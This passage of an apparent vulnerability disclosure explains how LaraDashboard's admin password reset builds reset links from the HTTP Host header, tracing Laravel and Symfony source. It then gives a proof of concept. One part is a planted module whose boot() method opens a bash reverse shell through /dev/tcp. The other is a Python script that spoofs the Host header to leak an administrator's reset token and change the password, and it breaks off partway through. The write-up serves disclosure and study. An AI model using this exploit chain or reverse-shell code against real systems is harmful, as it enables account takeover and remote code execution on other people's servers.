        <span class="p">}</span>
    <span class="p">}</span>
    
<span class="c1"># https://github.com/laradashboard/laradashboard/blob/main/app/Models/User.php#L97L105</span>
</code></pre></div></div><p>in the sendPasswordResetNotification() method, when the request path begins with admin/*, the application generates an adminresetpasswordnotification instance.</p><div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">class</span> <span class="nc">AdminResetPasswordNotification</span> <span class="kd">extends</span> <span class="nc">BaseResetPassword</span>
<span class="p">{</span>
    <span class="cd">/**
     * Build the mail representation of the notification.
     *
     * @param  mixed  $notifiable
     * @return \Illuminate\Notifications\Messages\MailMessage
     */</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">toMail</span><span class="p">(</span><span class="nv">$notifiable</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$url</span> <span class="o">=</span> <span class="nf">url</span><span class="p">(</span><span class="nf">route</span><span class="p">(</span><span class="s1">'admin.password.reset'</span><span class="p">,</span> <span class="p">[</span>
            <span class="s1">'token'</span> <span class="o">=&gt;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">token</span><span class="p">,</span>
            <span class="s1">'email'</span> <span class="o">=&gt;</span> <span class="nv">$notifiable</span><span class="o">-&gt;</span><span class="nf">getEmailForPasswordReset</span><span class="p">(),</span>
        <span class="p">],</span> <span class="kc">false</span><span class="p">));</span>

        <span class="k">return</span> <span class="p">(</span><span class="k">new</span> <span class="nc">MailMessage</span><span class="p">())</span>
            <span class="o">-&gt;</span><span class="nf">subject</span><span class="p">(</span><span class="nf">__</span><span class="p">(</span><span class="s1">'Reset Password Notification'</span><span class="p">))</span>
            <span class="o">-&gt;</span><span class="nf">line</span><span class="p">(</span><span class="nf">__</span><span class="p">(</span><span class="s1">'You are receiving this email because we received a password reset request for your account.'</span><span class="p">))</span>
            <span class="o">-&gt;</span><span class="nf">action</span><span class="p">(</span><span class="nf">__</span><span class="p">(</span><span class="s1">'Reset Password'</span><span class="p">),</span> <span class="nv">$url</span><span class="p">)</span>
            <span class="o">-&gt;</span><span class="nf">line</span><span class="p">(</span><span class="nf">__</span><span class="p">(</span><span class="s1">'If you did not request a password reset, no further action is required.'</span><span class="p">));</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="c1"># https://github.com/laradashboard/laradashboard/blob/main/app/Notifications/AdminResetPasswordNotification.php</span>
</code></pre></div></div><p>the toMail() method of the AdminResetPasswordNotification class generates the content used for sending the email, which includes a url containing the reset token. this URL is constructed using the url() method, and no subsequent validation logic is applied afterwards.</p><h3 id="laravels-url-method-for-url-generation"> <a href="#laravels-url-method-for-url-generation" class="anchor-heading" aria-labelledby="laravels-url-method-for-url-generation"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Laravel’s url() method for URL generation</h3><div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">function</span> <span class="n">url</span><span class="p">(</span><span class="nv">$path</span> <span class="o">=</span> <span class="kc">null</span><span class="p">,</span> <span class="nv">$parameters</span> <span class="o">=</span> <span class="p">[],</span> <span class="nv">$secure</span> <span class="o">=</span> <span class="kc">null</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">is_null</span><span class="p">(</span><span class="nv">$path</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nf">app</span><span class="p">(</span><span class="nc">UrlGenerator</span><span class="o">::</span><span class="n">class</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="nf">app</span><span class="p">(</span><span class="nc">UrlGenerator</span><span class="o">::</span><span class="n">class</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">to</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="nv">$parameters</span><span class="p">,</span> <span class="nv">$secure</span><span class="p">);</span>
    <span class="p">}</span>
    
<span class="c1"># https://github.com/laravel/framework/blob/12.x/src/Illuminate/Foundation/helpers.php#L1056L1063</span>
</code></pre></div></div><p>laravel’s url() function is defined in illuminate/foundation/helpers.php#l1056–l1063, and internally it delegates the url generation to the to() method.</p><div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">public</span> <span class="k">function</span> <span class="n">to</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="nv">$extra</span> <span class="o">=</span> <span class="p">[],</span> <span class="nv">$secure</span> <span class="o">=</span> <span class="kc">null</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="c1">// First we will check if the URL is already a valid URL. If it is we will not</span>
        <span class="c1">// try to generate a new one but will simply return the URL as is, which is</span>
        <span class="c1">// convenient since developers do not always have to check if it's valid.</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">isValidUrl</span><span class="p">(</span><span class="nv">$path</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nv">$path</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="nv">$tail</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="nb">array_map</span><span class="p">(</span>
            <span class="s1">'rawurlencode'</span><span class="p">,</span> <span class="p">(</span><span class="k">array</span><span class="p">)</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">formatParameters</span><span class="p">(</span><span class="nv">$extra</span><span class="p">))</span>
        <span class="p">);</span>

        <span class="c1">// Once we have the scheme we will compile the "tail" by collapsing the values</span>
        <span class="c1">// into a single string delimited by slashes. This just makes it convenient</span>
        <span class="c1">// for passing the array of parameters to this URL as a list of segments.</span>
        <span class="nv">$root</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">formatRoot</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">formatScheme</span><span class="p">(</span><span class="nv">$secure</span><span class="p">));</span>

        <span class="p">[</span><span class="nv">$path</span><span class="p">,</span> <span class="nv">$query</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">extractQueryString</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>

        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">format</span><span class="p">(</span>
            <span class="nv">$root</span><span class="p">,</span> <span class="s1">'/'</span><span class="mf">.</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$path</span><span class="mf">.</span><span class="s1">'/'</span><span class="mf">.</span><span class="nv">$tail</span><span class="p">,</span> <span class="s1">'/'</span><span class="p">)</span>
        <span class="p">)</span><span class="mf">.</span><span class="nv">$query</span><span class="p">;</span>
    <span class="p">}</span>

<span class="c1"># https://github.com/laravel/framework/blob/12.x/src/Illuminate/Routing/UrlGenerator.php#L208L231</span>
</code></pre></div></div><p>the to() method internally calls the formatroot() method, which constructs the starting portion of the base url.</p><div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">public</span> <span class="k">function</span> <span class="n">formatRoot</span><span class="p">(</span><span class="nv">$scheme</span><span class="p">,</span> <span class="nv">$root</span> <span class="o">=</span> <span class="kc">null</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">is_null</span><span class="p">(</span><span class="nv">$root</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">is_null</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">cachedRoot</span><span class="p">))</span> <span class="p">{</span>
                <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">cachedRoot</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">forcedRoot</span> <span class="o">?:</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="nf">root</span><span class="p">();</span>
            <span class="p">}</span>

            <span class="nv">$root</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">cachedRoot</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="nv">$start</span> <span class="o">=</span> <span class="nf">str_starts_with</span><span class="p">(</span><span class="nv">$root</span><span class="p">,</span> <span class="s1">'http://'</span><span class="p">)</span> <span class="o">?</span> <span class="s1">'http://'</span> <span class="o">:</span> <span class="s1">'https://'</span><span class="p">;</span>

        <span class="k">return</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'~'</span><span class="mf">.</span><span class="nv">$start</span><span class="mf">.</span><span class="s1">'~'</span><span class="p">,</span> <span class="nv">$scheme</span><span class="p">,</span> <span class="nv">$root</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

<span class="c1"># https://github.com/laravel/framework/blob/12.x/src/Illuminate/Routing/UrlGenerator.php#L628L641</span>
</code></pre></div></div><p>inside the formatRoot() method, the $root variable is defined by calling the request-&gt;root() method.</p><div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">public</span> <span class="k">function</span> <span class="n">root</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="nb">rtrim</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getSchemeAndHttpHost</span><span class="p">()</span><span class="mf">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getBaseUrl</span><span class="p">(),</span> <span class="s1">'/'</span><span class="p">);</span>
    <span class="p">}</span>

<span class="c1"># https://github.com/laravel/framework/blob/12.x/src/Illuminate/Http/Request.php#L113L116</span>
</code></pre></div></div><p>the root() method internally concatenates the values returned by getSchemeAndHttpHost() and getBaseUrl(), and then returns the result. these methods are defined within the symfony library.</p><h3 id="symfonys-getschemeandhttphost-method"> <a href="#symfonys-getschemeandhttphost-method" class="anchor-heading" aria-labelledby="symfonys-getschemeandhttphost-method"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Symfony’s getSchemeAndHttpHost() method</h3><div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">public</span> <span class="k">function</span> <span class="n">getHttpHost</span><span class="p">():</span> <span class="kt">string</span>
    <span class="p">{</span>
        <span class="nv">$scheme</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getScheme</span><span class="p">();</span>
        <span class="nv">$port</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getPort</span><span class="p">();</span>

        <span class="k">if</span> <span class="p">((</span><span class="s1">'http'</span> <span class="o">===</span> <span class="nv">$scheme</span> <span class="o">&amp;&amp;</span> <span class="mi">80</span> <span class="o">==</span> <span class="nv">$port</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="s1">'https'</span> <span class="o">===</span> <span class="nv">$scheme</span> <span class="o">&amp;&amp;</span> <span class="mi">443</span> <span class="o">==</span> <span class="nv">$port</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getHost</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getHost</span><span class="p">()</span><span class="mf">.</span><span class="s1">':'</span><span class="mf">.</span><span class="nv">$port</span><span class="p">;</span>
    <span class="p">}</span>
    
<span class="c1"># https://github.com/symfony/symfony/blob/24f8e13faef66a70260581684c669f0e03d1b4dd/src/Symfony/Component/HttpFoundation/Request.php#L981L991</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">getSchemeAndHttpHost</span><span class="p">():</span> <span class="kt">string</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getScheme</span><span class="p">()</span><span class="mf">.</span><span class="s1">'://'</span><span class="mf">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getHttpHost</span><span class="p">();</span>
    <span class="p">}</span>

<span class="c1"># https://github.com/symfony/symfony/blob/24f8e13faef66a70260581684c669f0e03d1b4dd/src/Symfony/Component/HttpFoundation/Request.php#L1009L1012</span>
</code></pre></div></div><p>the getSchemeAndHttpHost() method internally calls both getScheme() and getHttpHost() to construct and return the base url. as shown in the implementation of getHttpHost(), it simply retrieves and returns the value of the host header by default.</p><p>yes, that’s a good catch. without additional security measures in place, this behavior can indeed be abused in a meaningful way.</p><div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">public</span> <span class="k">function</span> <span class="n">getHost</span><span class="p">():</span> <span class="kt">string</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">isFromTrustedProxy</span><span class="p">()</span> <span class="o">&amp;&amp;</span> <span class="nv">$host</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getTrustedValues</span><span class="p">(</span><span class="k">self</span><span class="o">::</span><span class="no">HEADER_X_FORWARDED_HOST</span><span class="p">))</span> <span class="p">{</span>
            <span class="nv">$host</span> <span class="o">=</span> <span class="nv">$host</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nv">$host</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">headers</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s1">'HOST'</span><span class="p">)</span> <span class="o">?:</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">server</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s1">'SERVER_NAME'</span><span class="p">)</span> <span class="o">?:</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">server</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s1">'SERVER_ADDR'</span><span class="p">,</span> <span class="s1">''</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="c1">// trim and remove port number from host</span>
        <span class="c1">// host is lowercase as per RFC 952/2181</span>
        <span class="nv">$host</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/:\d+$/'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$host</span><span class="p">)));</span>

        <span class="c1">// the host can come from the user (HTTP_HOST and depending on the configuration, SERVER_NAME too can come from the user)</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$host</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">self</span><span class="o">::</span><span class="nf">isHostValid</span><span class="p">(</span><span class="nv">$host</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">isHostValid</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">return</span> <span class="s1">''</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">isHostValid</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>

            <span class="k">throw</span> <span class="k">new</span> <span class="nc">SuspiciousOperationException</span><span class="p">(</span><span class="nf">\sprintf</span><span class="p">(</span><span class="s1">'Invalid Host "%s".'</span><span class="p">,</span> <span class="nv">$host</span><span class="p">));</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="nf">\count</span><span class="p">(</span><span class="k">self</span><span class="o">::</span><span class="nv">$trustedHostPatterns</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">// to avoid host header injection attacks, you should provide a list of trusted host patterns</span>

            <span class="k">if</span> <span class="p">(</span><span class="nf">\in_array</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span> <span class="k">self</span><span class="o">::</span><span class="nv">$trustedHosts</span><span class="p">,</span> <span class="kc">true</span><span class="p">))</span> <span class="p">{</span>
                <span class="k">return</span> <span class="nv">$host</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="k">foreach</span> <span class="p">(</span><span class="k">self</span><span class="o">::</span><span class="nv">$trustedHostPatterns</span> <span class="k">as</span> <span class="nv">$pattern</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span> <span class="nv">$host</span><span class="p">))</span> <span class="p">{</span>
                    <span class="k">self</span><span class="o">::</span><span class="nv">$trustedHosts</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$host</span><span class="p">;</span>

                    <span class="k">return</span> <span class="nv">$host</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>

            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">isHostValid</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">return</span> <span class="s1">''</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">isHostValid</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>

            <span class="k">throw</span> <span class="k">new</span> <span class="nc">SuspiciousOperationException</span><span class="p">(</span><span class="nf">\sprintf</span><span class="p">(</span><span class="s1">'Untrusted Host "%s".'</span><span class="p">,</span> <span class="nv">$host</span><span class="p">));</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="nv">$host</span><span class="p">;</span>
    <span class="p">}</span>
    
<span class="c1"># https://github.com/symfony/symfony/blob/24f8e13faef66a70260581684c669f0e03d1b4dd/src/Symfony/Component/HttpFoundation/Request.php#L1131L1177</span>
</code></pre></div></div><h3 id="how-this-logic-can-be-exploited-to-achieve-account-takeover"> <a href="#how-this-logic-can-be-exploited-to-achieve-account-takeover" class="anchor-heading" aria-labelledby="how-this-logic-can-be-exploited-to-achieve-account-takeover"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> How this logic can be exploited to achieve Account takeover</h3><p>in the /admin/password/reset route, it is possible to trigger the delivery of a password reset token using an email address. however, since the application is not vulnerable to email pollution, an alternative method must be exploited to leak the reset token.</p><p>in laravel’s default token-delivery logic, the url containing the reset token is generated using the value of the HOST header as the domain. therefore, if no additional url validation is implemented, an attacker can manipulate the hostname to force the application to send a crafted or malicious reset link.</p><h1 id="proof-of-concept"> <a href="#proof-of-concept" class="anchor-heading" aria-labelledby="proof-of-concept"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Proof of Concept</h1><h2 id="poc-file"> <a href="#poc-file" class="anchor-heading" aria-labelledby="poc-file"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> PoC File</h2><p><a href="attachment:29e7db3e-592a-4ec9-a845-60845a7de957:1-Click_Pre-Auth_RCE_PoC.zip">1-Click Pre-Auth RCE PoC.zip</a></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ tree
.
├── crm
│   ├── Providers
│   │   ├── CrmServiceProvider.php
│   │   ├── EventServiceProvider.php
│   │   └── RouteServiceProvider.php
│   ├── app
│   │   └── Http
│   │       └── Controllers
│   │           └── CrmController.php
│   ├── composer.json
│   ├── config
│   │   └── config.php
│   ├── database
│   │   ├── factories
│   │   ├── migrations
│   │   └── seeders
│   │       └── CrmDatabaseSeeder.php
│   ├── module.json
│   ├── package.json
│   ├── resources
│   │   ├── assets
│   │   │   ├── js
│   │   │   │   └── app.js
│   │   │   └── sass
│   │   │       └── app.scss
│   │   └── views
│   │       ├── index.blade.php
│   │       └── layouts
│   │           └── master.blade.php
│   ├── routes
│   │   ├── api.php
│   │   └── web.php
│   ├── tests
│   │   ├── Feature
│   │   └── Unit
│   └── vite.config.js
├── crm.zip
└── poc.py

eg) python3 poc.py localhost:8000 admin@example.com
</code></pre></div></div><p>The PoC file is uploaded as a ZIP archive.</p><h2 id="our-environment"> <a href="#our-environment" class="anchor-heading" aria-labelledby="our-environment"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Our environment</h2><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CMS         : localhost:8000
CMD's Admin : mailexploit621@gmail.com

Attacker Server : localhost 3434
Netcat          : localhost 8008
</code></pre></div></div><p>our environment is configured as shown above. the cms server is running on port 8000, and the administrator’s email address is <a href="mailto:mailexploit621@gmail.com">mailexploit621@gmail.com</a>.</p><p>additionally, the attacker’s server (a flask server) is running on port 3434, and the server intended to receive the reverse shell is listening on port 8008 via netcat.</p><h2 id="poc-code"> <a href="#poc-code" class="anchor-heading" aria-labelledby="poc-code"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> PoC Code</h2><h3 id="php-code---crmprovidercrmserviceproviderphp"> <a href="#php-code---crmprovidercrmserviceproviderphp" class="anchor-heading" aria-labelledby="php-code---crmprovidercrmserviceproviderphp"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> PHP Code - Crm/Provider/CrmServiceProvider.php</h3><div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">public</span> <span class="k">function</span> <span class="n">boot</span><span class="p">():</span> <span class="kt">void</span>
    <span class="p">{</span>
        <span class="nb">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
        <span class="nv">$flag</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"http://localhost:3434/state"</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="nv">$flag</span> <span class="o">==</span> <span class="s2">"False"</span><span class="p">)</span> <span class="p">{</span>
            <span class="nb">exec</span><span class="p">(</span><span class="s2">"/bin/bash -i &gt;&amp; /dev/tcp/localhost/8008 0&gt;&amp;1 &amp;"</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">registerCommands</span><span class="p">();</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">registerCommandSchedules</span><span class="p">();</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">registerTranslations</span><span class="p">();</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">registerConfig</span><span class="p">();</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">registerViews</span><span class="p">();</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">loadMigrationsFrom</span><span class="p">(</span><span class="nf">module_path</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="s1">'database/migrations'</span><span class="p">));</span>
    <span class="p">}</span>
</code></pre></div></div><p>before running poc.py, modify the CrmServiceProvider::boot() method to include the command you wish to execute. for example, if the address for receiving the reverse shell is different, you should update it accordingly.</p><h3 id="python-code---pocpy"> <a href="#python-code---pocpy" class="anchor-heading" aria-labelledby="python-code---pocpy"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Python Code - poc.py</h3><div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">os</span>
<span class="kn">import</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="n">secrets</span>
<span class="kn">import</span> <span class="n">string</span>
<span class="kn">import</span> <span class="n">threading</span>
<span class="kn">import</span> <span class="n">time</span>
<span class="kn">from</span> <span class="n">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span>
<span class="kn">from</span> <span class="n">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>

<span class="n">app</span> <span class="o">=</span> <span class="nc">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>

<span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">admin_email</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
<span class="n">flask_host</span> <span class="o">=</span> <span class="sh">"</span><span class="s">localhost</span><span class="sh">"</span>
<span class="n">flask_port</span> <span class="o">=</span> <span class="mi">3434</span>
<span class="n">connection</span> <span class="o">=</span> <span class="sh">"</span><span class="s">False</span><span class="sh">"</span>

<span class="k">def</span> <span class="nf">generate_password</span><span class="p">(</span><span class="n">length</span><span class="o">=</span><span class="mi">16</span><span class="p">):</span>
    <span class="n">chars</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span>
    <span class="k">return</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">secrets</span><span class="p">.</span><span class="nf">choice</span><span class="p">(</span><span class="n">chars</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">length</span><span class="p">))</span> <span class="o">+</span> <span class="sh">'</span><span class="s">@</span><span class="sh">'</span>

<span class="k">def</span> <span class="nf">get_token</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">path</span><span class="p">)</span>
    <span class="n">soup</span> <span class="o">=</span> <span class="nc">BeautifulSoup</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="p">,</span> <span class="sh">"</span><span class="s">html.parser</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">token</span> <span class="o">=</span> <span class="n">soup</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">"</span><span class="s">input</span><span class="sh">"</span><span class="p">,</span> <span class="p">{</span><span class="sh">"</span><span class="s">name</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">_token</span><span class="sh">"</span><span class="p">})[</span><span class="sh">"</span><span class="s">value</span><span class="sh">"</span><span class="p">]</span>
    <span class="n">cookies</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="nf">get_dict</span><span class="p">()</span>
    <span class="nf">return </span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">cookies</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">send_pin</span><span class="p">():</span>
    <span class="n">token</span><span class="p">,</span> <span class="n">cookies</span> <span class="o">=</span> <span class="nf">get_token</span><span class="p">(</span><span class="sh">"</span><span class="s">/admin/password/reset</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">body</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">_token</span><span class="sh">"</span><span class="p">:</span><span class="n">token</span><span class="p">,</span> <span class="sh">"</span><span class="s">email</span><span class="sh">"</span><span class="p">:</span><span class="n">admin_email</span><span class="p">}</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">Host</span><span class="sh">"</span><span class="p">:</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">flask_host</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">flask_port</span><span class="si">}</span><span class="sh">"</span><span class="p">}</span>
    <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">/admin/password/email</span><span class="sh">"</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">body</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">change_password</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">email</span><span class="p">,</span> <span class="n">new_password</span><span class="p">):</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] new password : </span><span class="si">{</span><span class="n">new_password</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">token</span><span class="p">,</span> <span class="n">cookies</span> <span class="o">=</span> <span class="nf">get_token</span><span class="p">(</span><span class="sh">"</span><span class="s">/admin/password/reset</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">body</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">_token</span><span class="sh">"</span><span class="p">:</span><span class="n">token</span><span class="p">,</span> <span class="sh">"</span><span class="s">token</span><span class="sh">"</span><span class="p">:</span><span class="n">uid</span><span class="p">,</span> <span class="sh">"</span><span class="s">email</span><span class="sh">"</span><span class="p">:</span><span class="n">email</span><span class="p">,</span> <span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">:</span><span class="n">new_password</span><span class="p">,</span> <span class="sh">"</span><span class="s">password_confirmation</span><span class="sh">"</span><span class="p">:</span><span class="n">new_password</span><span class="p">}</span>
    <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">/admin/password/reset</span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">body</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">email</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
